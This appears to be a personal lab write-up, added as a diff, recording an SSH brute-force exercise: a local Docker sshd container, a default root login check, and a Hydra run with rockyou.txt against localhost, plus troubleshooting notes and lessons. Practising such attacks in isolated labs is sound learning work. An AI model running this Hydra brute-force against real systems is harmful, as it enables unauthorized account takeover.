@@ -1,0 +1,55 @@
+*OOBJECTIVE*
+Perform an SSH brute-force attack using Hydra against an isolated Docker container.
+
+*ENVIRONMENT*
+-Attacker: Kali Linux (host)
+-Target: Docker container running `rastasheep/ubuntu-sshd`
+-Target SSH Port: 2222 → 22 (container)
+-Wordlist: rockyou.txt
+
+1.) Deploy the Target
+-sudo docker pull rastasheep/ubuntu-sshd
+-sudo docker run -d --name ssh-lab -p 2222:22 rastasheep/ubuntu-sshd
+-sudo docker ps
+
+Target should show:
+-0.0.0.0:2222->22/tcp
+
+
+
+2.) Verify SSH Access
+-ssh root@127.0.0.1 -p 2222
+-Default password: root
+-Then: exit
+
+    -This confirms the service is ready and reachable.
+
+
+
+3.) Run Hydra Attack
+  -hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://127.0.0.1:2222
+
+
+
+*ISSUES ENCOUNTERED*
+>Hydra Run Time
+    -Hydra initially appeared slow due to SSH rate-limiting and thread load.
+
+
+*EARLIER ATTEMPTS* (Before Docker)
+VM networking failures
+    -A VM was deployed using a Ubuntu ISO, I kept runnning into complications such as; missing SSH service, "connections refused" errors and package repository unereachables. Switching to Docker eliminated all issues.
+
+
+
+5.) Key Learnings
+
+* Docker provides clean, predictable targets for attack labs.
+* Hydra performance depends on SSH rate limits, not just CPU power. (further investigation for futre labs)
+* Always validate target connectivity before brute-forcing. (Note to self)
+* Using Docker prevents risk to host SSH configuration.
+
+
+*OUTCOME*
+
+Successfully brute-forced the SSH root password through Hydra using a contained, reproducible target environment.
